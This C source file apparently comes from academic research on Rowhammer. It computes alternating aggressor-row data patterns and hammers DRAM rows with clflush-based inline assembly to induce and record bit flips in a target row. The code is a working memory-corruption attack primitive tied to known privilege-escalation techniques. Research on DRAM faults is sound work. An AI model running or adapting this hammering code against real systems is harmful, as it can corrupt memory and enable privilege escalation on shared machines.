// Copyright 2019, Sangwoo Ji
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

// Code snippet for calculating alternating pattern and Pinpoint Rowhammer
//
// This code is compatible with DRAM modules which have following bank bits:
// 14th xor 17th
// 15th xor 18th
// 16th xor 19th
//
// For other modules, refer Xiao et al., "One Bit Flips, One Cloud Flops: Cross-VM Row Hammer Attacks and Privilege Escalation", USENIX Security 2016
//
// Original author: Sangwoo Ji (sangwooji@postech.edu)

#include "pinpoint_module.h"

#define ZERO 0x0000000000000000UL
#define ONE 0xffffffffffffffffUL

uint64_t first_data[8] ={ZERO, ZERO, ONE, ONE, ZERO, ZERO, ONE, ONE};
uint64_t target_data[8]={ZERO, ZERO, ZERO, ZERO, ONE, ONE, ONE, ONE};
uint64_t second_data[8]={ZERO, ONE, ONE, ZERO, ZERO, ONE, ONE, ZERO};

void AlternateOnePattern(
    uint64_t first_alter[][1024],
    uint64_t second_alter[][1024],
    uint8_t pattern,
    uint32_t index,
    uint64_t bit_mask) {

    for (uint8_t i=0; i<12; i++) {
      first_alter[i][index] = (first_alter[i][index]&(~bit_mask))|
          (first_data[pattern]&bit_mask);
      second_alter[i][index] = (second_alter[i][index]&(~bit_mask))|
          (second_data[pattern]&bit_mask);
    }
}
 
void AlternateTwoPatterns(
    uint64_t first_alter[][1024],
    uint64_t second_alter[][1024],
    uint8_t first_pattern,
    uint8_t second_pattern,
    uint32_t index,
    uint64_t bit_mask) {

    for (uint8_t i=0; i<12; i+=2) {
      first_alter[i][index] = (first_alter[i][index]&(~bit_mask))|
          (first_data[first_pattern]&bit_mask);
      second_alter[i][index] = (second_alter[i][index]&(~bit_mask))|
          (second_data[first_pattern]&bit_mask);

      first_alter[i+1][index] = (first_alter[i+1][index]&(~bit_mask))|
          (first_data[second_pattern]&bit_mask);
      second_alter[i+1][index] = (second_alter[i+1][index]&(~bit_mask))|
          (second_data[second_pattern]&bit_mask);
    }
}

void AlternateThreePatterns(
    uint64_t first_alter[][1024],
    uint64_t second_alter[][1024],
    uint8_t first_pattern,
    uint8_t second_pattern,
    uint8_t third_pattern,
    uint32_t index,
    uint64_t bit_mask) {

    for (uint8_t i=0; i<12; i+=3) {
      first_alter[i][index] = (first_alter[i][index]&(~bit_mask))|
          (first_data[first_pattern]&bit_mask);
      second_alter[i][index] = (second_alter[i][index]&(~bit_mask))|
          (second_data[first_pattern]&bit_mask);

      first_alter[i+1][index] = (first_alter[i+1][index]&(~bit_mask))|
          (first_data[second_pattern]&bit_mask);
      second_alter[i+1][index] = (second_alter[i+1][index]&(~bit_mask))|
          (second_data[second_pattern]&bit_mask);

      first_alter[i+2][index] = (first_alter[i+2][index]&(~bit_mask))|
          (first_data[third_pattern]&bit_mask);
      second_alter[i+2][index] = (second_alter[i+2][index]&(~bit_mask))|
          (second_data[third_pattern]&bit_mask);
    }
}

void AlternateFourPatterns(
    uint64_t first_alter[][1024],
    uint64_t second_alter[][1024], 
    uint32_t index,
    uint64_t bit_mask) {

    for (uint8_t i=0; i<12; i++) {
      first_alter[i][index] = ((first_alter[i][index]&(~bit_mask))|
          (first_data[i%4]&bit_mask));
      second_alter[i][index] = (second_alter[i][index]&(~bit_mask))|
          (second_data[i%4]&bit_mask);
    }
}  

void ComputePinpointData(
    uint64_t first_alter[][1024],
    uint64_t second_alter[][1024],
    uint32_t index,
    uint64_t bit_mask,
    uint8_t flip_results) {
  switch (flip_results) {
    case 0b0000:
    case 0b1111:
      AlternateFourPatterns(first_alter, second_alter, index, bit_mask);
      break;
    case 0b0001:
      AlternateThreePatterns(first_alter, second_alter, 0, 1, 2, index, bit_mask);
      break;
    case 0b0010:
      AlternateThreePatterns(first_alter, second_alter, 0, 1, 3, index, bit_mask);
      break;
    case 0b0100:
      AlternateThreePatterns(first_alter, second_alter, 0, 2, 3, index, bit_mask);
      break;
    case 0b1000:
      AlternateThreePatterns(first_alter, second_alter, 1, 2, 3, index, bit_mask);
      break;
    case 0b0011:
      AlternateTwoPatterns(first_alter, second_alter, 0, 1, index, bit_mask);
      break;
    case 0b0101:
      AlternateTwoPatterns(first_alter, second_alter, 0, 2, index, bit_mask);
      break;
    case 0b0110:
      AlternateTwoPatterns(first_alter, second_alter, 0, 3, index, bit_mask);
      break;
    case 0b1001:
      AlternateTwoPatterns(first_alter, second_alter, 1, 2, index, bit_mask);
      break;
    case 0b1010:
      AlternateTwoPatterns(first_alter, second_alter, 1, 3, index, bit_mask);
      break;
    case 0b1100:
      AlternateTwoPatterns(first_alter, second_alter, 2, 3, index, bit_mask);
      break;
    case 0b0111:
      AlternateOnePattern(first_alter, second_alter, 0, index, bit_mask);
      break;
    case 0b1011:
      AlternateOnePattern(first_alter, second_alter, 1, index, bit_mask);
      break;
    case 0b1101:
      AlternateOnePattern(first_alter, second_alter, 2, index, bit_mask);
      break;
    case 0b1110:
      AlternateOnePattern(first_alter, second_alter, 3, index, bit_mask);
      break;
  }
}

void HammerWithPattern(
    uint64_t* first_row,
    uint64_t* second_row,
    uint64_t* target_row,
    uint64_t first_data,
    uint64_t second_data,
    uint64_t target_data,
    uint64_t number_of_reads,
    uint64_t* results) {

  memset(first_row, first_data, 0x2000);
  memset(second_row, second_data, 0x2000);
  memset(target_row, target_data, 0x2000);

  for (uint32_t index = 0; index < 1024; index+=8) {
    asm volatile(
        "clflush (%0);\n\t"
        "clflush (%1);\n\t"
        "clflush (%2);\n\t"
        ::"r"(&first_row[index]),"r"(&second_row[index]),"r"(&target_row[index]):"memory");
  }

  while (number_of_reads-- > 0) {
    //sum += first_pointer[0];
    //sum += second_pointer[0];
    asm volatile(
        "mov (%0), %%rdx\n\t"
        "mov (%1), %%rdx\n\t"
        "clflush (%0);\n\t"
        "clflush (%1);\n\t"
        : : "r" (first_row), "r" (second_row) : "memory", "rdx");
  }

  for (uint32_t index = 0; index < 1024; ++index) {
    results[index] = target_row[index] ^ target_data;
  }
}

void PinpointRowhammer(
    uint64_t* first_row,
    uint64_t* second_row,
    uint64_t* target_row,
    uint64_t target_data,
    uint64_t first_alter[][1024],
    uint64_t second_alter[][1024],
    uint32_t number_of_reads,
    uint64_t* results) {

  memset(target_row, target_data, 0x2000);

  for (uint32_t index = 0; index < 1024; index+=8) {
    asm volatile(
        "clflush (%0);\n\t"
        ::"r"(&target_row[index]):"memory");
  }

  for (uint32_t i=0; i<12; i++) {
    for (uint32_t index=0; index<1024; index++) {
      __asm__ __volatile__(
          "mov %0, %%rdx\n\t"
          "mov %%rdx, (%1)\n\t"
          "mov %2, %%rdx\n\t"
          "mov %%rdx, (%3)\n\t"
          "clflush (%1)\n\t"
          "clflush (%3)\n\t"
          :
          :"r" (first_alter[i][index]), "r" (&first_row[index]), "r" (second_alter[i][index]), "r" (&second_row[index])
          :"rdx", "memory");
    }

    uint32_t reads_per_pattern = number_of_reads/12-1024;
    while (reads_per_pattern-- > 0) {
      asm volatile(
          "mov (%0), %%rdx\n\t"
          "mov (%1), %%rdx\n\t"
          "clflush (%0);\n\t"
          "clflush (%1);\n\t"
          : : "r" (first_row), "r" (second_row) : "memory", "rdx");
    }
  }

  for (uint32_t index = 0; index < 1024; ++index) {
    results[index] = target_row[index] ^ target_data;
  }
}
